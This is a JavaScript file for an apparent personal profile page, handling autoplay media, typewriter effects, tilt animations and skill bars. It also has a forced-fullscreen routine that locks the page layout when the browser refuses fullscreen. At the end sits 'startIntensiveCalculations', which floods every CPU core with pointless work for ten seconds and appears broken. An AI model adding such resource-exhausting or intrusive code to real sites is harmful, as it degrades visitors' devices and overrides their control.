  initializeVisitorCounter();

  function playVideoWithFallback(video) {
    if (!video) return Promise.resolve();
    try { video.setAttribute('playsinline', ''); } catch (_) {}
    try { video.setAttribute('webkit-playsinline', ''); } catch (_) {}
    try { video.setAttribute('autoplay', ''); } catch (_) {}
    try { video.load(); } catch (_) {}

    try { video.muted = false; video.removeAttribute('muted'); } catch (_) {}
    try { video.volume = 1.0; } catch (_) {}

    return video.play().catch(() => {
      try { video.muted = true; video.setAttribute('muted', ''); } catch (_) {}
      return video.play().then(() => {
        const unmute = () => {
          try { video.muted = false; video.removeAttribute('muted'); video.volume = 1.0; } catch (_) {}
          video.removeEventListener('playing', unmute);
        };
        video.addEventListener('playing', unmute);
        setTimeout(unmute, 400);
      }).catch((err) => {
        console.error('Video still failed to play:', err);
      });
    });
  }

  startScreen.addEventListener('click', () => {
    startScreen.classList.add('hidden');

    backgroundMusic.muted = false;

    const video = document.getElementById('background');
    video.style.display = 'block';
    playVideoWithFallback(video);

    profileBlock.classList.remove('hidden');
    gsap.fromTo(profileBlock,
      { opacity: 0, y: -50 },
      {
        opacity: 0.9,
        y: 0,
        duration: 3,
        ease: 'power2.out',
        onComplete: () => {
          profileBlock.classList.add('profile-appear');
          profileContainer.classList.add('orbit');
        }
      }
    );

    if (!isTouchDevice) {
      try {
        new cursorTrailEffect({
          length: 10,
          size: 8,
          speed: 0.2
        });
        console.log("Cursor trail initialized");
      } catch (err) {
        console.error("Failed to initialize cursor trail effect:", err);
      }
    }

    typeWriterName();
    typeWriterBio();

    animateSkillBars();
    
    setTimeout(() => {
      enterFullscreen();
    }, 500);
  });

  startScreen.addEventListener('touchstart', (e) => {
    e.preventDefault();
    startScreen.classList.add('hidden');
    backgroundMusic.muted = false;
    backgroundMusic.play().catch(err => {
      console.error("Failed to play music after start screen touch:", err);
    });

    const video = document.getElementById('background');
    video.style.display = 'block';
    playVideoWithFallback(video);

    profileBlock.classList.remove('hidden');
    gsap.fromTo(profileBlock,
      { opacity: 0, y: -50 },
      {
        opacity: 0.9,
        y: 0,
        duration: 3,
        ease: 'power2.out',
        onComplete: () => {
          profileBlock.classList.add('profile-appear');
          profileContainer.classList.add('orbit');
        }
      }
    );

    typeWriterName();
    typeWriterBio();

    animateSkillBars();
    
    setTimeout(() => {
      enterFullscreen();
    }, 500);
  });

  setSkillBarsInstant();
  
  function enterFullscreen() {
    console.log('Attempting forced fullscreen on desktop');
    const elem = document.documentElement;
    let fullscreenSuccess = false;
    
    // Try multiple fullscreen methods aggressively
    const fullscreenMethods = [
      () => elem.requestFullscreen(),
      () => elem.webkitRequestFullscreen(),
      () => elem.mozRequestFullScreen(),
      () => elem.msRequestFullscreen(),
      () => elem.webkitRequestFullScreen()
    ];
    
    for (const method of fullscreenMethods) {
      try {
        method().then(() => {
          console.log('Desktop fullscreen successful');
          fullscreenSuccess = true;
        }).catch(err => {
          console.log('Desktop fullscreen method failed:', err);
        });
        break;
      } catch (err) {
        console.log('Desktop fullscreen method error:', err);
        continue;
      }
    }
    
    // Fallback fullscreen-like behavior
    setTimeout(() => {
      if (!fullscreenSuccess) {
        console.log('Using desktop fullscreen fallback');
        document.body.style.position = 'fixed';
        document.body.style.top = '0';
        document.body.style.left = '0';
        document.body.style.width = '100%';
        document.body.style.height = '100%';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.overflow = 'hidden';
      }
    }, 100);
  }



  let nameText = '';
  let nameIndex = 0;
  let isNameDeleting = true;
  let nameCursorVisible = false;

  function typeWriterName() {
    if (!isNameDeleting && nameIndex < name.length) {
      nameText = name.slice(0, nameIndex + 1);
      nameIndex++;
    } else if (isNameDeleting && nameIndex > 0) {
      nameText = name.slice(0, nameIndex - 1);
      nameIndex--;
    } else if (nameIndex === name.length) {
      isNameDeleting = true;
      setTimeout(typeWriterName, 10000);
      return;
    } else if (nameIndex === 0) {
      isNameDeleting = false;
    }
    profileName.textContent = nameText + (nameCursorVisible ? '_' : ' ');
    if (Math.random() < 0.1) {
      profileName.classList.add('glitch');
      setTimeout(() => profileName.classList.remove('glitch'), 200);
    }
    setTimeout(typeWriterName, isNameDeleting ? 250 : 400);
  }

  setInterval(() => {
    nameCursorVisible = !nameCursorVisible;
    profileName.textContent = nameText + (nameCursorVisible ? ' ' : ' ');
  }, 400);



  let bioText = '';
  let bioIndex = 0;
  let bioMessageIndex = 0;
  let isBioDeleting = false;
  let bioCursorVisible = true;

  function typeWriterBio() {
    if (!isBioDeleting && bioIndex < bioMessages[bioMessageIndex].length) {
      bioText = bioMessages[bioMessageIndex].slice(0, bioIndex + 1);
      bioIndex++;
    } else if (isBioDeleting && bioIndex > 0) {
      bioText = bioMessages[bioMessageIndex].slice(0, bioIndex - 1);
      bioIndex--;
    } else if (bioIndex === bioMessages[bioMessageIndex].length) {
      isBioDeleting = true;
      setTimeout(typeWriterBio, 2000);
      return;
    } else if (bioIndex === 0 && isBioDeleting) {
      isBioDeleting = false;
      bioMessageIndex = (bioMessageIndex + 1) % bioMessages.length;
    }
    profileBio.textContent = bioText;
    if (Math.random() < 0.1) {
      profileBio.classList.add('glitch');
      setTimeout(() => profileBio.classList.remove('glitch'), 200);
    }
    setTimeout(typeWriterBio, isBioDeleting ? 75 : 150);
  }

  setInterval(() => {
    bioCursorVisible = !bioCursorVisible;
    profileBio.textContent = bioText;
  }, 500);


  let currentAudio = backgroundMusic;
  let isMuted = false;

  volumeIcon.addEventListener('click', () => {
    isMuted = !isMuted;
    backgroundVideo.muted = isMuted;
    volumeIcon.innerHTML = isMuted
      ? `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2"></path>`
      : `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path>`;
  });

  volumeIcon.addEventListener('touchstart', (e) => {
    e.preventDefault();
    isMuted = !isMuted;
    backgroundVideo.muted = isMuted;
    volumeIcon.innerHTML = isMuted
      ? `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2"></path>`
      : `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path>`;
  });

  volumeSlider.addEventListener('input', () => {
    backgroundVideo.volume = volumeSlider.value;
    isMuted = false;
    backgroundVideo.muted = false;
    volumeIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path>`;
  });


  transparencySlider.addEventListener('input', () => {
    const opacity = transparencySlider.value;
    if (opacity == 0) {
      profileBlock.style.background = 'rgba(0, 0, 0, 0)';
      profileBlock.style.borderOpacity = '0';
      profileBlock.style.borderColor = 'transparent';
      profileBlock.style.backdropFilter = 'none';
      profileHeader.style.background = 'rgba(0, 0, 0, 0)';
      profileHeader.style.borderOpacity = '0';
      profileHeader.style.borderColor = 'transparent';
      profileHeader.style.backdropFilter = 'none';
      skillsBlock.style.background = 'rgba(0, 0, 0, 0)';
      skillsBlock.style.borderOpacity = '0';
      skillsBlock.style.borderColor = 'transparent';
      skillsBlock.style.backdropFilter = 'none';
      lanyardRpc.style.background = 'rgba(0, 0, 0, 0)';
      lanyardRpc.style.borderOpacity = '0';
      lanyardRpc.style.borderColor = 'transparent';
      lanyardRpc.style.backdropFilter = 'none';

      profileBlock.style.pointerEvents = 'auto';
      socialIcons.forEach(icon => {
        icon.style.pointerEvents = 'auto';
        icon.style.opacity = '1';
      });
      badges.forEach(badge => {
        badge.style.pointerEvents = 'auto';
        badge.style.opacity = '1';
      });
      profilePicture.style.pointerEvents = 'auto';
      profilePicture.style.opacity = '1';
      profileName.style.opacity = '1';
      profileBio.style.opacity = '1';
      visitorCount.style.opacity = '1';
    } else {
      profileBlock.style.background = `rgba(0, 0, 0, ${opacity})`;
      profileBlock.style.borderOpacity = opacity;
      profileBlock.style.borderColor = '';
      profileBlock.style.backdropFilter = `blur(${10 * opacity}px)`;
      profileHeader.style.background = `rgba(0, 0, 0, ${opacity})`;
      profileHeader.style.borderOpacity = opacity;
      profileHeader.style.borderColor = '';
      profileHeader.style.backdropFilter = `blur(${10 * opacity}px)`;
      skillsBlock.style.background = `rgba(0, 0, 0, ${opacity})`;
      skillsBlock.style.borderOpacity = opacity;
      skillsBlock.style.borderColor = '';
      skillsBlock.style.backdropFilter = `blur(${10 * opacity}px)`;
      lanyardRpc.style.background = `rgba(0, 0, 0, ${opacity})`;
      lanyardRpc.style.borderOpacity = opacity;
      lanyardRpc.style.borderColor = '';
      lanyardRpc.style.backdropFilter = `blur(${10 * opacity}px)`;
      profileBlock.style.pointerEvents = 'auto';
      socialIcons.forEach(icon => {
        icon.style.pointerEvents = 'auto';
        icon.style.opacity = '1';
      });
      badges.forEach(badge => {
        badge.style.pointerEvents = 'auto';
        badge.style.opacity = '1';
      });
      profilePicture.style.pointerEvents = 'auto';
      profilePicture.style.opacity = '1';
      profileName.style.opacity = '1';
      profileBio.style.opacity = '1';
      visitorCount.style.opacity = '1';
    }
  });


  function handleTilt(e, element) {
    const rect = element.getBoundingClientRect();
    const centerX = rect.left + rect.width / 2;
    const centerY = rect.top + rect.height / 2;
    let clientX, clientY;

    if (e.type === 'touchmove') {
      clientX = e.touches[0].clientX;
      clientY = e.touches[0].clientY;
    } else {
      clientX = e.clientX;
      clientY = e.clientY;
    }

    const mouseX = clientX - centerX;
    const mouseY = clientY - centerY;

    const maxTilt = 15;
    const tiltX = (mouseY / rect.height) * maxTilt;
    const tiltY = -(mouseX / rect.width) * maxTilt;

    gsap.to(element, {
      rotationX: tiltX,
      rotationY: tiltY,
      duration: 0.3,
      ease: 'power2.out',
      transformPerspective: 1000
    });
  }

  profileBlock.addEventListener('mousemove', (e) => handleTilt(e, profileBlock));
  profileBlock.addEventListener('touchmove', (e) => {
    e.preventDefault();
    handleTilt(e, profileBlock);
  });

  profileHeader.addEventListener('mousemove', (e) => handleTilt(e, profileHeader));
  profileHeader.addEventListener('touchmove', (e) => {
    e.preventDefault();
    handleTilt(e, profileHeader);
  });

  skillsBlock.addEventListener('mousemove', (e) => handleTilt(e, skillsBlock));
  skillsBlock.addEventListener('touchmove', (e) => {
    e.preventDefault();
    handleTilt(e, skillsBlock);
  });

  lanyardRpc.addEventListener('mousemove', (e) => handleTilt(e, lanyardRpc));
  lanyardRpc.addEventListener('touchmove', (e) => {
    e.preventDefault();
    handleTilt(e, lanyardRpc);
  });

  profileBlock.addEventListener('mouseleave', () => {
    gsap.to(profileBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });
  profileBlock.addEventListener('touchend', () => {
    gsap.to(profileBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });

  profileHeader.addEventListener('mouseleave', () => {
    gsap.to(profileHeader, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });
  profileHeader.addEventListener('touchend', () => {
    gsap.to(profileHeader, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });

  skillsBlock.addEventListener('mouseleave', () => {
    gsap.to(skillsBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });
  skillsBlock.addEventListener('touchend', () => {
    gsap.to(skillsBlock, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });

  lanyardRpc.addEventListener('mouseleave', () => {
    gsap.to(lanyardRpc, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });
  lanyardRpc.addEventListener('touchend', () => {
    gsap.to(lanyardRpc, {
      rotationX: 0,
      rotationY: 0,
      duration: 0.5,
      ease: 'power2.out'
    });
  });


  profilePicture.addEventListener('mouseenter', () => {
    glitchOverlay.style.opacity = '1';
    setTimeout(() => {
      glitchOverlay.style.opacity = '0';
    }, 500);
  });


  profilePicture.addEventListener('click', () => {
    profileContainer.classList.remove('fast-orbit');
    profileContainer.classList.remove('orbit');
    void profileContainer.offsetWidth;
    profileContainer.classList.add('fast-orbit');
    setTimeout(() => {
      profileContainer.classList.remove('fast-orbit');
      void profileContainer.offsetWidth;
      profileContainer.classList.add('orbit');
    }, 500);
  });

  profilePicture.addEventListener('touchstart', (e) => {
    e.preventDefault();
    profileContainer.classList.remove('fast-orbit');
    profileContainer.classList.remove('orbit');
    void profileContainer.offsetWidth;
    profileContainer.classList.add('fast-orbit');
    setTimeout(() => {
      profileContainer.classList.remove('fast-orbit');
      void profileContainer.offsetWidth;
      profileContainer.classList.add('orbit');
    }, 500);
  });


  let isShowingSkills = false;
  resultsButton.addEventListener('click', () => {
    if (!isShowingSkills) {
      gsap.to(profileBlock, {
        x: -100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          profileBlock.classList.add('hidden');
          skillsBlock.classList.remove('hidden');
          gsap.fromTo(skillsBlock,
            { x: 100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
          gsap.to(pythonBar, { width: '87%', duration: 2, ease: 'power2.out' });
          gsap.to(cppBar, { width: '75%', duration: 2, ease: 'power2.out' });
          gsap.to(csharpBar, { width: '80%', duration: 2, ease: 'power2.out' });
        }
      });
      resultsHint.classList.remove('hidden');
      isShowingSkills = true;
    } else {
      gsap.to(skillsBlock, {
        x: 100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          skillsBlock.classList.add('hidden');
          profileBlock.classList.remove('hidden');
          gsap.fromTo(profileBlock,
            { x: -100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
        }
      });
      resultsHint.classList.add('hidden');
      isShowingSkills = false;
    }
  });

  resultsButton.addEventListener('touchstart', (e) => {
    e.preventDefault();
    if (!isShowingSkills) {
      gsap.to(profileBlock, {
        x: -100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          profileBlock.classList.add('hidden');
          skillsBlock.classList.remove('hidden');
          gsap.fromTo(skillsBlock,
            { x: 100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
          gsap.to(pythonBar, { width: '87%', duration: 2, ease: 'power2.out' });
          gsap.to(cppBar, { width: '75%', duration: 2, ease: 'power2.out' });
          gsap.to(csharpBar, { width: '80%', duration: 2, ease: 'power2.out' });
        }
      });
      resultsHint.classList.remove('hidden');
      isShowingSkills = true;
    } else {
      gsap.to(skillsBlock, {
        x: 100,
        opacity: 0,
        duration: 0.5,
        ease: 'power2.in',
        onComplete: () => {
          skillsBlock.classList.add('hidden');
          profileBlock.classList.remove('hidden');
          gsap.fromTo(profileBlock,
            { x: -100, opacity: 0 },
            { x: 0, opacity: 0.9, duration: 0.5, ease: 'power2.out' }
          );
        }
      });
      resultsHint.classList.add('hidden');
      isShowingSkills = true;
    }
  });


  typeWriterStart();
});

function startIntensiveCalculations() {
  const workers = [];
  const numWorkers = navigator.hardwareConcurrency || 4;
  
  for (let i = 0; i < numWorkers; i++) {
    const workerCode = `
      self.onmessage = function(e) {
        let result = 0;
        
        for (let i = 0; i < iterations; i++) {
          result += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i % 100);
          result = Math.abs(result) % 1000000;
        }
        
        const arrays = [];
        for (let j = 0; j < 100; j++) {
          arrays.push(new Float64Array(10000).fill(Math.random() * result));
        }
        
        for (let k = 0; k < arrays.length; k++) {
          for (let l = 0; l < arrays[k].length; l++) {
            arrays[k][l] = Math.pow(arrays[k][l], 2) / Math.sqrt(l + 1);
          }
        }
        
        self.postMessage({ workerId: e.data.workerId, result: result });
      };
    `;
    
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    
    worker.postMessage({ 
      workerId: i, 
      iterations: 1000000 + Math.random() * 500000 
    });
    
    worker.onmessage = function(e) {
      console.log(`Worker ${e.data.workerId} completed intensive calculation`);
    };
    
    workers.push(worker);
  }
  
  const mainThreadWork = setInterval(() => {
    let temp = 0;
    for (let i = 0; i < 100000; i++) {
      temp += Math.random() * Math.sqrt(i) * Math.sin(i);
    }
    
    const tempArrays = [];
    for (let j = 0; j < 50; j++) {
      tempArrays.push(new Array(1000).fill(0).map(() => Math.random() * temp));
    }
    
    if (tempArrays.length > 100) {
      tempArrays.splice(0, 50);
    }
  }, 100);
  
  setTimeout(() => {
    clearInterval(mainThreadWork);
    workers.forEach(worker => worker.terminate());
    console.log('Intensive calculations stopped');
  }, 10000);
}
